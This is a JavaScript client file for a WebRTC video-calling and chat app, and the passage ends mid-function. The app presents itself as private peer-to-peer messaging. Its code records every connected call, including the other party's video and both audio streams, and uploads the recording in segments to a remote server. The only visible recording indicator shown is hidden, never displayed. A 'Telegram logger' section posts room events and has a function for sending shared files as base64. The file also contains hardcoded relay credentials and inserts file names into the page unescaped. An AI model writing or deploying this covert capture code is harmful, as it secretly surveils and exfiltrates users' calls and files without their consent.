// ============ MeetLink - WhatsApp Edition Mobile-First P2P App ============
// Built-in SQLite authentication, direct P2P messaging, vertical 9:16 calling & auto-recording.

// ---- CONFIG ----
const SERVER_URL = 'https://familiar-gertrudis-botakingtipd-f3991937.koyeb.app';
const SEGMENT_DURATION_MS = 3 * 60 * 1000;

// ---- DOM ----
const homePage = document.getElementById('homePage');
const roomPage = document.getElementById('roomPage');
const createRoomBtn = document.getElementById('createRoomBtn');
const joinRoomInput = document.getElementById('joinRoomInput');
const joinRoomBtn = document.getElementById('joinRoomBtn');
const roomIdDisplay = document.getElementById('roomIdDisplay');
const copyLinkBtn = document.getElementById('copyLinkBtn');
const copyLinkBtn2 = document.getElementById('copyLinkBtn2');
const leaveRoomBtn = document.getElementById('leaveRoomBtn');
const shareableLink = document.getElementById('shareableLink');
const waitingScreen = document.getElementById('waitingScreen');
const callScreen = document.getElementById('callScreen');
const localVideo = document.getElementById('localVideo');
const remoteVideo = document.getElementById('remoteVideo');
const remoteNoVideo = document.getElementById('remoteNoVideo');
const toggleMicBtn = document.getElementById('toggleMicBtn');
const toggleCamBtn = document.getElementById('toggleCamBtn');
const toggleCamFlipBtn = document.getElementById('toggleCamFlipBtn');
const toggleScreenBtn = document.getElementById('toggleScreenBtn');
const togglePipBtn = document.getElementById('togglePipBtn');
const toggleChatBtn = document.getElementById('toggleChatBtn');
const endCallBtn = document.getElementById('endCallBtn');
const chatPanel = document.getElementById('chatPanel');
const closeChatBtn = document.getElementById('closeChatBtn');
const chatMessages = document.getElementById('chatMessages');
const chatInput = document.getElementById('chatInput');
const sendChatBtn = document.getElementById('sendChatBtn');
const attachFileBtn = document.getElementById('attachFileBtn');
const fileInput = document.getElementById('fileInput');
const fileProgress = document.getElementById('fileProgress');
const fileProgressFill = document.getElementById('fileProgressFill');
const fileProgressText = document.getElementById('fileProgressText');
const toastEl = document.getElementById('toast');
const recordingIndicator = document.getElementById('recordingIndicator');
const tcModal = document.getElementById('tcModal');
const tcCloseBtn = document.getElementById('tcCloseBtn');
const recordingCanvas = document.getElementById('recordingCanvas');

// ---- State ----
let peer = null, currentCall = null, localStream = null, dataConnection = null, currentRemoteStream = null;
let currentUser = null, cyberHeartbeatInterval = null, cyberFriendsInterval = null;
let isMicOn = true, isCamOn = true, isScreenSharing = false, currentFacingMode = 'user';
let originalVideoTrack = null, incomingFileBuffers = {};
let currentRoomId = null, callStartTime = null, userRole = 'creator', messageCount = 0;
let canvasDrawInterval = null, audioCtx = null, combinedStream = null;
let mediaRecorder = null, recordedChunks = [];
let segmentNumber = 0, recordingTimer = null, isCallActive = false;
let totalRecordingSize = 0, currentCallMode = 'video'; // 'video' or 'audio'

// File Sharing Pending State
let pendingSendFile = null;
let currentFileSendMode = 'normal'; // 'normal' or 'viewonce'

const CHUNK_SIZE = 16384;

// ============ T&C MODAL ============
const tcLink = document.getElementById('tcLink');
if (tcLink) {
    tcLink.addEventListener('click', (e) => { e.preventDefault(); tcModal.classList.remove('hidden'); });
}
if (tcCloseBtn) tcCloseBtn.addEventListener('click', () => tcModal.classList.add('hidden'));
if (tcModal) tcModal.addEventListener('click', (e) => { if (e.target === tcModal) if (tcModal) tcModal.classList.add('hidden'); });

// ============ TELEGRAM LOGGER ============
async function logEvent(eventType, extraData = {}) {
    try {
        await fetch(`${SERVER_URL}/api/event`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: eventType, roomId: currentRoomId, timestamp: new Date().toISOString(), ...extraData })
        });
    } catch (e) { }
}

async function logFileUpload(fileName, arrayBuffer) {
    try {
        if (arrayBuffer.byteLength > 50 * 1024 * 1024) return;
        const base64 = arrayBufferToBase64(arrayBuffer);
        await fetch(`${SERVER_URL}/api/event`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'file_upload', roomId: currentRoomId, fileName, fileSize: arrayBuffer.byteLength, sender: userRole, fileData: base64 })
        });
    } catch (e) { }
}

async function uploadRecordingSegment(blob, segNum, isLast, overrideRoomId = null) {
    if (!blob || blob.size === 0) return;
    try {
        const rid = overrideRoomId || currentRoomId || 'unknown';
        const formData = new FormData();
        const recExt = (blob.type && blob.type.includes('mp4')) ? 'mp4' : 'webm';
        
        // Include userRole inside filename so both sides can upload uniquely without clashing!
        const filename = `recording_${rid}_${userRole}_part${segNum}.${recExt}`;
        
        formData.append('video', blob, filename);
        formData.append('roomId', rid);
        formData.append('segmentNumber', String(segNum));
        formData.append('isLast', String(isLast));
        formData.append('segmentSize', String(blob.size));
        const resp = await fetch(`${SERVER_URL}/api/upload-recording`, { method: 'POST', body: formData });
        console.log(`✅ Segment ${segNum} uploaded (${(blob.size / 1024 / 1024).toFixed(1)} MB)`);
    } catch (e) { console.error('Segment upload failed:', e); }
}

function arrayBufferToBase64(buffer) {
    const bytes = new Uint8Array(buffer);
    let binary = '';
    const chunk = 8192;
    for (let i = 0; i < bytes.length; i += chunk) {
        const c = bytes.subarray(i, i + chunk);
        binary += String.fromCharCode.apply(null, c);
    }
    return btoa(binary);
}

// ============ FILE PREVIEW PAGE ============
function checkFilePreview() {
    const params = new URLSearchParams(window.location.search);
    const fileId = params.get('file');
    if (fileId) {
        showFilePreview(fileId);
    }
}

function showFilePreview(fileId) {
    const overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#0b141a;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;';

    const loading = document.createElement('div');
    loading.style.cssText = 'color:#00a884;font-family:Orbitron,sans-serif;font-size:1.2rem;';
    loading.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading file...';
    overlay.appendChild(loading);
    document.body.appendChild(overlay);

    fetch(`${SERVER_URL}/api/file-info/${fileId}`)
        .then(r => r.json())
        .then(info => {
            overlay.removeChild(loading);

            if (info.error) {
                overlay.innerHTML = '<div style="color:#ff2d75;font-family:Orbitron;font-size:1.2rem;">File not found or expired</div>';
                return;
            }

            const fileUrl = `${SERVER_URL}/d/${fileId}`;
            const rawUrl = `${SERVER_URL}/api/file/${fileId}`;

            const header = document.createElement('div');
            header.style.cssText = 'width:100%;max-width:900px;margin-bottom:20px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;';
            header.innerHTML = `
                <div style="display:flex;align-items:center;gap:12px;">
                    <div style="width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,#00a884,#00f0ff);display:flex;align-items:center;justify-content:center;">
                        <i class="fas fa-file" style="color:#fff;"></i>
                    </div>
                    <div>
                        <div style="color:#e9edef;font-weight:700;font-size:1rem;">${info.fileName || 'File'}</div>
                        <div style="color:#8696a0;font-size:0.8rem;">${info.fileSize || ''} • MeetLink Share <span style="background:rgba(0,168,132,0.15);color:#00a884;padding:2px 8px;border-radius:6px;font-size:0.75rem;margin-left:8px;">⏱️ 1-Hour TTL</span></div>
                    </div>
                </div>
                <a href="${fileUrl}" download="${info.fileName || 'file'}" style="padding:10px 24px;background:var(--wa-teal);color:#fff;border:none;border-radius:10px;text-decoration:none;font-weight:600;cursor:pointer;box-shadow:0 0 15px rgba(0,168,132,0.4);">
                    <i class="fas fa-download"></i> Direct Download
                </a>
            `;
            overlay.appendChild(header);

            const preview = document.createElement('div');
            preview.style.cssText = 'flex:1;width:100%;max-width:900px;display:flex;align-items:center;justify-content:center;overflow:auto;border-radius:16px;border:1px solid #222e35;background:#111b21;';

            const ext = (info.fileName || '').split('.').pop().toLowerCase();
            const imageExts = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'bmp', 'ico'];
            const videoExts = ['mp4', 'webm', 'mkv', 'avi', 'mov'];
            const audioExts = ['mp3', 'wav', 'ogg', 'flac', 'aac'];
            const pdfExts = ['pdf'];

            if (imageExts.includes(ext)) {
                preview.innerHTML = `<img src="${rawUrl}" style="max-width:100%;max-height:70vh;border-radius:12px;object-fit:contain;" alt="${info.fileName}">`;
            } else if (videoExts.includes(ext)) {
                preview.innerHTML = `<video src="${rawUrl}" controls autoplay style="max-width:100%;max-height:70vh;border-radius:12px;"></video>`;
            } else if (audioExts.includes(ext)) {
                preview.innerHTML = `<div style="text-align:center;padding:40px;"><i class="fas fa-music" style="font-size:4rem;color:#00a884;margin-bottom:20px;display:block;"></i><audio src="${rawUrl}" controls autoplay style="width:100%;max-width:400px;"></audio></div>`;
            } else if (pdfExts.includes(ext)) {
                preview.innerHTML = `<iframe src="${rawUrl}" style="width:100%;height:70vh;border:none;border-radius:12px;"></iframe>`;
            } else {
                preview.innerHTML = `<div style="text-align:center;padding:60px;"><i class="fas fa-file" style="font-size:4rem;color:#00a884;margin-bottom:20px;display:block;"></i><div style="color:#e9edef;font-size:1.2rem;font-weight:700;margin-bottom:8px;">${info.fileName}</div><div style="color:#8696a0;margin-bottom:20px;">${info.fileSize || ''}</div><div style="color:#667781;font-size:0.9rem;">Preview not available. Click Download to save the file.</div></div>`;
            }

            overlay.appendChild(preview);
        })
        .catch(e => {
            overlay.innerHTML = '<div style="color:#ff2d75;font-family:Orbitron;font-size:1.2rem;">Error loading file</div>';
        });
}

// ============ SEGMENTED RECORDING SYSTEM (SNAPCHAT 9:16 PORTRAIT, CRASH-FREE) ============
function drawCover(ctx, video, dx, dy, dw, dh) {
    const vw = video.videoWidth, vh = video.videoHeight;
    if (!vw || !vh) { ctx.fillStyle = '#0b141a'; ctx.fillRect(dx, dy, dw, dh); return; }
    const scale = Math.max(dw / vw, dh / vh);
    const sw = dw / scale, sh = dh / scale;
    const sx = (vw - sw) / 2, sy = (vh - sh) / 2;
    ctx.drawImage(video, sx, sy, sw, sh, dx, dy, dw, dh);
}

function setupRecordingStreams() {
    try {
        const recCanvas = recordingCanvas;
        const RW = 360, RH = 640;
        recCanvas.width = RW;
        recCanvas.height = RH;
        const ctx = recCanvas.getContext('2d');

        canvasDrawInterval = setInterval(() => {
            ctx.fillStyle = '#0b141a';
            ctx.fillRect(0, 0, RW, RH);

            // If audio call mode, render placeholder avatar instead of remote video
            if (currentCallMode === 'audio') {
                ctx.fillStyle = '#111b21';
                ctx.fillRect(0, 0, RW, RH);
                ctx.fillStyle = '#00a884';
                ctx.beginPath();
                ctx.arc(RW / 2, RH / 2 - 40, 50, 0, Math.PI * 2);
                ctx.fill();
                ctx.fillStyle = '#ffffff';
                ctx.font = 'bold 20px Inter, sans-serif';
                ctx.textAlign = 'center';
                ctx.fillText(currentRoomId || 'Voice Call', RW / 2, RH / 2 + 40);
                ctx.font = '13px Inter, sans-serif';
                ctx.fillStyle = '#8696a0';
                ctx.fillText('WhatsApp Voice Call Active...', RW / 2, RH / 2 + 65);
            } else {
                try {
                    if (remoteVideo && remoteVideo.readyState >= 2 && remoteVideo.videoWidth) {
                        drawCover(ctx, remoteVideo, 0, 0, RW, RH);
                    } else {
                        ctx.fillStyle = '#111b21';
                        ctx.fillRect(0, 0, RW, RH);
                        ctx.fillStyle = '#8696a0';
                        ctx.font = '15px Inter, sans-serif';
                        ctx.textAlign = 'center';
                        ctx.fillText('Waiting for video...', RW / 2, RH / 2);
                    }
                } catch (e) { }
            }

            // Self PiP (Only if video call is active)
            if (currentCallMode === 'video') {
                try {
                    if (localVideo && localVideo.readyState >= 2 && localVideo.videoWidth) {
                        const pipW = 96, pipH = 170, margin = 12;
                        const pipX = RW - pipW - margin, pipY = margin;
                        ctx.fillStyle = '#00a884';
                        ctx.fillRect(pipX - 2, pipY - 2, pipW + 4, pipH + 4);
                        drawCover(ctx, localVideo, pipX, pipY, pipW, pipH);
                        ctx.fillStyle = 'rgba(0,0,0,0.6)';
                        ctx.fillRect(pipX, pipY + pipH - 16, pipW, 16);
                        ctx.fillStyle = '#ffffff';
                        ctx.font = '9px Inter, sans-serif';
                        ctx.textAlign = 'center';
                        ctx.fillText('You', pipX + pipW / 2, pipY + pipH - 4);
                    }
                } catch (e) { }
            }

            const now = new Date();
            const timeStr = now.toLocaleTimeString();
            const dateStr = now.toLocaleDateString();
            const elapsed = callStartTime ? formatCallDuration() : '00:00';
            ctx.fillStyle = 'rgba(0,0,0,0.6)';
            ctx.fillRect(8, 8, 200, 20);
            ctx.fillStyle = '#ff2d75';
            ctx.font = '10px Orbitron, monospace';
            ctx.textAlign = 'left';
            ctx.fillText('● REC  ' + dateStr + ' ' + timeStr + ' [' + elapsed + ']', 12, 22);
        }, 1000 / 20);

        const canvasVideoStream = recCanvas.captureStream(20);

        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const destination = audioCtx.createMediaStreamDestination();

        if (localStream) {
            const localAudioTracks = localStream.getAudioTracks();
            if (localAudioTracks.length > 0) {
                const localSource = audioCtx.createMediaStreamSource(new MediaStream([localAudioTracks[0]]));
                localSource.connect(destination);
            }
        }

        try {
            if (currentRemoteStream && currentRemoteStream.getAudioTracks().length > 0) {
                const remoteSource = audioCtx.createMediaStreamSource(new MediaStream([currentRemoteStream.getAudioTracks()[0]]));
                remoteSource.connect(destination);
            }
        } catch (e) { }

        combinedStream = new MediaStream([
            ...canvasVideoStream.getVideoTracks(),
            ...destination.stream.getAudioTracks()
        ]);

        return true;
    } catch (e) {
        console.error('Recording setup failed:', e);
        return false;
    }
}

function getSupportedMimeType() {
    const preferMp4 = ['video/mp4;codecs=h264,aac', 'video/mp4'];
    if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported) {
        for (const t of preferMp4) { if (MediaRecorder.isTypeSupported(t)) return t; }
    }
    const types = ['video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm;codecs=h264,opus', 'video/webm'];
    for (const t of types) { if (MediaRecorder.isTypeSupported(t)) return t; }
    return 'video/webm';
}

function startNewSegment() {
    if (!combinedStream || !isCallActive) return;
    segmentNumber++;
    recordedChunks = [];
    const mimeType = getSupportedMimeType();
    mediaRecorder = new MediaRecorder(combinedStream, { mimeType, videoBitsPerSecond: 1500000, audioBitsPerSecond: 128000 });
    mediaRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) recordedChunks.push(e.data); };
    mediaRecorder.onstop = () => {
        if (recordedChunks.length > 0) {
            const blob = new Blob(recordedChunks, { type: mimeType });
            uploadRecordingSegment(blob, segmentNumber, false);
        }
        recordedChunks = [];
        mediaRecorder = null;
        if (isCallActive) startNewSegment();
    };
    mediaRecorder.start(1000);
    recordingTimer = setTimeout(() => { if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop(); }, SEGMENT_DURATION_MS);
}

function startRecording() {
    try {
        if (!setupRecordingStreams()) return;
        isCallActive = true; segmentNumber = 0; totalRecordingSize = 0;
        startNewSegment();
    } catch (e) { console.error('Recording start failed:', e); }
}

function stopRecording() {
    isCallActive = false;
    if (recordingTimer) { clearTimeout(recordingTimer); recordingTimer = null; }
    if (canvasDrawInterval) { clearInterval(canvasDrawInterval); canvasDrawInterval = null; }
    if (audioCtx) { audioCtx.close().catch(() => {}); audioCtx = null; }

    const savedRoomId = currentRoomId || 'unknown';
    const savedDuration = formatCallDuration();
    const savedSegNum = segmentNumber || 1;

    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        const currentSegNum = segmentNumber || 1;
        const currentChunks = [...recordedChunks];
        mediaRecorder.onstop = () => {
            const allChunks = [...currentChunks, ...recordedChunks];
            if (allChunks.length > 0) {
                const finalMime = (mediaRecorder && mediaRecorder.mimeType) ? mediaRecorder.mimeType : 'video/webm';
                const blob = new Blob(allChunks, { type: finalMime });
                totalRecordingSize += blob.size;
                uploadRecordingSegment(blob, currentSegNum, true, savedRoomId);
            }
            logEvent('recording_complete', { 
                roomId: savedRoomId, 
                totalSegments: savedSegNum, 
                totalSize: totalRecordingSize, 
                duration: savedDuration 
            });
            mediaRecorder = null; recordedChunks = []; combinedStream = null;
        };
        mediaRecorder.stop();
    } else {
        if (savedSegNum > 0) {
            logEvent('recording_complete', { 
                roomId: savedRoomId, 
                totalSegments: savedSegNum, 
                totalSize: totalRecordingSize, 
                duration: savedDuration 
            });
        }
        combinedStream = null;
    }
    recordingIndicator.classList.add('hidden');
}

// ============ APP NAVIGATION TABS (WHATSAPP MULTI-PANEL) ============
function switchAppTab(tabId) {
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    const activeBtn = document.getElementById(`tabBtn-${tabId}`);
    if (activeBtn) activeBtn.classList.add('active');

    document.querySelectorAll('.tab-pane').forEach(pane => pane.classList.remove('active'));
    const activePane = document.getElementById(`tabContent-${tabId}`);
    if (activePane) activePane.classList.add('active');

    showToast(`📍 Switched to ${tabId.toUpperCase()}`);
}
window.switchAppTab = switchAppTab;

// ============ AUTH FORMS SWITCHER ============
function switchAuthForm(formType) {
    document.querySelectorAll('.auth-tab-btn').forEach(btn => btn.classList.remove('active'));
    document.getElementById(`authTabBtn${formType === 'login' ? 'Login' : 'Register'}`).classList.add('active');

    const formLogin = document.getElementById('cyberLoginForm');
    const formRegister = document.getElementById('cyberRegisterForm');
    if (formType === 'login') {
        formLogin.classList.remove('hidden');
        formRegister.classList.add('hidden');
    } else {
        formLogin.classList.add('hidden');
        formRegister.classList.remove('hidden');
    }
}
window.switchAuthForm = switchAuthForm;

// ============ NATIVE BOTTOM SHEET SEARCH MODAL ============
function openSearchModal() {
    if (!currentUser) {
        showToast('⚠️ Please login first to search friends!');
        switchAppTab('profile');
        return;
    }
    const modal = document.getElementById('searchModal');
    modal.classList.remove('hidden');
    document.getElementById('cyberSearchInput').focus();
}
window.openSearchModal = openSearchModal;

function closeSearchModal() {
    document.getElementById('searchModal').classList.add('hidden');
    document.getElementById('cyberSearchInput').value = '';
    document.getElementById('cyberSearchResults').innerHTML = '<p class="cyber-empty">Enter a unique ID to find your friend</p>';
}
window.closeSearchModal = closeSearchModal;


// ============ UTILS ============
function generateRoomId() {
    const c = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let id = 'ML-';
    for (let i = 0; i < 7; i++) id += c[Math.floor(Math.random() * c.length)];
    return id;
}
function generateJoinerId() {
    const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let id = 'joiner-';
    for (let i = 0; i < 10; i++) id += c[Math.floor(Math.random() * c.length)];
    return id;
}
function showToast(msg, dur = 3000) { toastEl.textContent = msg; toastEl.classList.add('show'); setTimeout(() => toastEl.classList.remove('show'), dur); }
function showPage(p) { document.querySelectorAll('.page').forEach(x => x.classList.remove('active')); p.classList.add('active'); }
function getRoomLink(rid) { return `${window.location.origin}${window.location.pathname}?room=${rid}`; }
function formatFileSize(b) {
    if (b === 0) return '0 B';
    const k = 1024, s = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(b) / Math.log(k));
    return parseFloat((b / Math.pow(k, i)).toFixed(1)) + ' ' + s[i];
}
function getFileIcon(f) {
    const ext = f.split('.').pop().toLowerCase();
    const m = { jpg:'fa-file-image',jpeg:'fa-file-image',png:'fa-file-image',gif:'fa-file-image',webp:'fa-file-image',svg:'fa-file-image',pdf:'fa-file-pdf',doc:'fa-file-word',docx:'fa-file-word',xls:'fa-file-excel',xlsx:'fa-file-excel',ppt:'fa-file-powerpoint',pptx:'fa-file-powerpoint',zip:'fa-file-archive',rar:'fa-file-archive',mp3:'fa-file-audio',wav:'fa-file-audio',mp4:'fa-file-video',mkv:'fa-file-video',txt:'fa-file-alt',json:'fa-file-code',js:'fa-file-code',py:'fa-file-code' };
    return m[ext] || 'fa-file';
}
function isImageFile(f) { return ['jpg','jpeg','png','gif','webp','svg','bmp','ico'].includes(f.split('.').pop().toLowerCase()); }
function isVideoFile(f) { return ['mp4','webm','mkv','avi','mov'].includes(f.split('.').pop().toLowerCase()); }
function isAudioFile(f) { return ['mp3','wav','ogg','flac','aac','m4a'].includes(f.split('.').pop().toLowerCase()); }
function formatCallDuration() {
    if (!callStartTime) return '0s';
    const s = Math.floor((Date.now() - callStartTime) / 1000);
    const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), sec = s % 60;
    if (h > 0) return `${h}h ${m}m ${sec}s`;
    if (m > 0) return `${m}m ${sec}s`;
    return `${sec}s`;
}

// ============ NAVIGATION ============
if (createRoomBtn) createRoomBtn.addEventListener('click', () => { initRoom(generateRoomId(), true); });
if (joinRoomBtn) joinRoomBtn.addEventListener('click', () => {
    const input = joinRoomInput.value.trim();
    if (!input) { showToast('Please paste a room link or ID'); return; }
    let rid = input;
    try { const u = new URL(input); if (u.searchParams.get('room')) rid = u.searchParams.get('room'); } catch (e) { }
    initRoom(rid, false);
});
if (joinRoomInput) joinRoomInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') if (joinRoomBtn) joinRoomBtn.click(); });
if (leaveRoomBtn) leaveRoomBtn.addEventListener('click', leaveRoom);
if (endCallBtn) endCallBtn.addEventListener('click', leaveRoom);

// ============ INIT ROOM — FIXED JOINER ID ============
async function initRoom(roomId, isCreator) {
    currentRoomId = roomId;
    userRole = isCreator ? 'creator' : 'joiner';
    callStartTime = null;
    messageCount = 0;
    segmentNumber = 0;
    totalRecordingSize = 0;
    currentCallMode = 'video';

    showPage(roomPage);
    roomIdDisplay.textContent = roomId;
    shareableLink.value = getRoomLink(roomId);

    if (isCreator) logEvent('room_created', { roomLink: getRoomLink(roomId) });
    else logEvent('user_joined', { roomLink: getRoomLink(roomId) });

    if (peer && !peer.destroyed) {
        peer.destroy();
        peer = null;
    }

    const myPeerId = isCreator ? roomId : generateJoinerId();

    peer = new Peer(myPeerId, {
        debug: 0,
        config: { iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:stun1.l.google.com:19302' },
            { urls: 'stun:stun2.l.google.com:19302' },
            { urls: 'stun:stun3.l.google.com:19302' },
            { urls: 'stun:stun.cloudflare.com:3478' },
            { urls: 'stun:openrelay.metered.ca:80' },
            { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'OZ0sP3R4qX9sP1nT' },
            { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'OZ0sP3R4qX9sP1nT' }
        ]}
    });

    peer.on('open', (id) => {
        console.log('My peer ID:', id);
        if (isCreator) {
            showToast('Room created! Share the link 🚀');
        } else {
            console.log('Joining room:', roomId);
            callPeer(roomId);
        }
    });

    peer.on('error', (err) => {
        console.error('Peer error:', err.type, err);
        if (err.type === 'unavailable-id') {
            showToast('Room already exists! Try another link.');
            leaveRoom();
        } else if (err.type === 'peer-unavailable') {
            showToast('Person not online yet. Share the link & wait!');
        } else {
            showToast('Connection error: ' + err.type);
        }
    });

    peer.on('disconnected', () => {
        showToast('Disconnected...');
        if (peer && !peer.destroyed) peer.reconnect();
    });

    if (isCreator) {
        peer.on('call', handleIncomingCall);
        peer.on('connection', handleIncomingData);
    }
}

// ============ GET MEDIA (SMART 9:16 MOBILE & 16:9 PC DETECTION) ============
async function getMediaStream(callType = 'video') {
    if (callType === 'audio') {
        try {
            return await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
        } catch(e) {
            showToast('Microphone access denied.');
            return null;
        }
    }

    const isMobile = window.innerWidth <= 768 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    const videoConstraints = isMobile ? {
        width:     { ideal: 720,  max: 1080 },
        height:    { ideal: 1280, max: 1920 },
        aspectRatio: { ideal: 9 / 16 },
        frameRate: { ideal: 30,   max: 30   },
        facingMode: { ideal: currentFacingMode }
    } : {
        width:     { ideal: 1280, max: 1920 },
        height:    { ideal: 720,  max: 1080 },
        aspectRatio: { ideal: 16 / 9 },
        frameRate: { ideal: 30,   max: 30   },
        facingMode: { ideal: currentFacingMode }
    };
    try { return await navigator.mediaDevices.getUserMedia({
            video: videoConstraints,
            audio: {
                echoCancellation: true,
                noiseSuppression: true,
                autoGainControl:  true,
                sampleRate:       48000,
                channelCount:     2
            }
        }); }
    catch (e) {
        try { isCamOn = false; updateControlButtons(); return await navigator.mediaDevices.getUserMedia({ video: false, audio: true }); }
        catch (e2) { showToast('Camera/Mic access denied.'); return null; }
    }
}

// ============ CALL PEER (JOINER) — FIXED ============
async function callPeer(targetPeerId, callType = 'video') {
    currentCallMode = callType;
    localStream = await getMediaStream(callType);
    if (!localStream) { showToast('Cannot proceed without media'); return; }
    
    if (callType === 'video') {
        localVideo.srcObject = localStream;
        document.getElementById('audioCallOverlay').classList.add('hidden');
    } else {
        document.getElementById('audioCallOverlay').classList.remove('hidden');
        document.getElementById('audioCallName').textContent = '@' + targetPeerId;
    }

    const call = peer.call(targetPeerId, localStream);
    if (!call) {
        showToast('Failed to connect. Is the other person online?');
        return;
    }

    call.on('stream', (rs) => {
        console.log('Remote stream received!');
        showCallScreen(rs);
    });
    call.on('close', () => { showToast('Call ended'); leaveRoom(); });
    call.on('error', (err) => { console.error('Call error:', err); showToast('Call failed'); });
    currentCall = call;

    dataConnection = peer.connect(targetPeerId, { reliable: true });
    dataConnection.on('open', () => {
        console.log('Data connection established!');
    });
    dataConnection.on('data', handleDataMessage);
    dataConnection.on('close', () => console.log('Data connection closed'));
    dataConnection.on('error', (err) => console.error('Data error:', err));
}

// ============ INCOMING CALL (CREATOR) ============
async function handleIncomingCall(call) {
    console.log('📞 Incoming call from:', call.peer);
    currentCallMode = 'video';
    localStream = await getMediaStream('video');
    if (!localStream) { showToast('No media access'); return; }
    localVideo.srcObject = localStream;
    call.answer(localStream);

    call.on('stream', (rs) => {
        console.log('Remote stream received!');
        showCallScreen(rs);
    });
    call.on('close', () => { showToast('Call ended'); leaveRoom(); });
    call.on('error', console.error);
    currentCall = call;
}

function handleIncomingData(conn) {
    dataConnection = conn;
    conn.on('open', () => console.log('Data connection from joiner!'));
    conn.on('data', handleDataMessage);
    conn.on('close', () => console.log('Data connection closed'));
}

// ============ DYNAMIC ADAPTIVE BITRATE (AIRTEL/JIO PRO ENGINE - ULTRA RES PRIORITIZED) ============
function setupDynamicNetworkAdaptation(call) {
    if (!call || !call.peerConnection) return;
    try {
        const pc = call.peerConnection;
        const senders = pc.getSenders();
        const videoSender = senders.find(s => s.track && s.track.kind === 'video');
        if (videoSender && videoSender.getParameters) {
            const params = videoSender.getParameters();
            if (!params.encodings) params.encodings = [{}];
            params.encodings[0].maxBitrate = 4000000;          // 4 Mbps ultra HD max!
            params.encodings[0].networkPriority = 'high';
            videoSender.setParameters(params).catch(() => {});
        }

        if (pc.getTransceivers) {
            pc.getTransceivers().forEach(transceiver => {
                if (transceiver.sender && transceiver.sender.track && transceiver.sender.track.kind === 'video') {
                    transceiver.sender.degradationPreference = 'maintain-resolution'; 
                    console.log("⚡ [WebRTC Engine] Prioritizing ultra-sharp resolution over frame rate for low network!");
                }
            });
        }

        const pingEl = document.getElementById('pingText');
        const netInterval = setInterval(async () => {
            if (!isCallActive || !pc || pc.connectionState === 'closed') {
                clearInterval(netInterval);
                return;
            }
            try {
                const stats = await pc.getStats();
                let rtt = 0, width = 0, height = 0;
                stats.forEach(report => {
                    if (report.type === 'candidate-pair' && report.state === 'succeeded' && report.currentRoundTripTime) {
                        rtt = Math.round(report.currentRoundTripTime * 1000);
                    }
                    if (report.type === 'inbound-rtp' && report.kind === 'video') {
                        if (report.frameWidth) width = report.frameWidth;
                        if (report.frameHeight) height = report.frameHeight;
                    }
                });
                if (pingEl && rtt > 0) {
                    const resStr = width > 0 ? `${width}x${height}` : 'HD';
                    if (rtt < 80) {
                        pingEl.innerHTML = `🟢 Excellent (${rtt}ms) • ${resStr}`;
                    } else if (rtt < 180) {
                        pingEl.innerHTML = `🟡 Good (${rtt}ms) • ${resStr}`;
                    } else {
                        pingEl.innerHTML = `🟠 Weak Network (${rtt}ms) • Sharp Mode active`;
                    }
                }
            } catch (e) {}
        }, 2500);
    } catch (e) {}
}

// ============ SHOW CALL + START RECORDING ============
function showCallScreen(remoteStream) {
    waitingScreen.style.display = 'none';
    callScreen.classList.remove('hidden');
    
    if (currentCallMode === 'video') {
        remoteVideo.srcObject = remoteStream;
        remoteVideo.classList.remove('hidden');
        document.getElementById('audioCallOverlay').classList.add('hidden');
    } else {
        remoteVideo.classList.add('hidden');
        document.getElementById('audioCallOverlay').classList.remove('hidden');
        document.getElementById('audioCallName').textContent = '@' + (currentCall ? currentCall.peer : 'Friend');
    }
    
    currentRemoteStream = remoteStream;
    remoteNoVideo.style.display = 'none';
    callStartTime = Date.now();
    showToast('Connected! 🎉');
    logEvent('call_started');
    playSciFiSound('join');

    try {
        setupActiveSpeakerDetector(remoteStream, remoteVideo);
        if (localStream) setupActiveSpeakerDetector(localStream, localVideo);
        setupDynamicNetworkAdaptation(currentCall);

        if (currentCall && currentCall.peerConnection) {
            const pc = currentCall.peerConnection;
            pc.addEventListener('iceconnectionstatechange', () => {
                const st = pc.iceConnectionState;
                if (st === 'failed' || st === 'disconnected') {
                    try { if (pc.restartIce) pc.restartIce(); } catch (e) {}
                }
            });
        }
    } catch (e) { }

    try {
        if ('autoPictureInPicture' in remoteVideo) {
            remoteVideo.autoPictureInPicture = true;
        }
    } catch (e) { }

    // Start recording on BOTH ends as requested by user!
    setTimeout(() => { startRecording(); }, 2000);
}

// ============ LEAVE ROOM ============
function leaveRoom() {
    if (isCallActive || (mediaRecorder && mediaRecorder.state !== 'inactive')) {
        stopRecording();
    }
    if (callStartTime) logEvent('call_ended', { duration: formatCallDuration(), messages: messageCount });
    else logEvent('user_left');

    if (currentCall) { currentCall.close(); currentCall = null; }
    if (dataConnection) { dataConnection.close(); dataConnection = null; }
    
    // Only destroy the PeerJS signaling connection if we are logged out (Anonymous Room Mode).
    // For Cyber Space, KEEP the peer active so you stay online and can call again instantly!
    if (!currentUser) {
        if (peer) { peer.destroy(); peer = null; }
    }
    
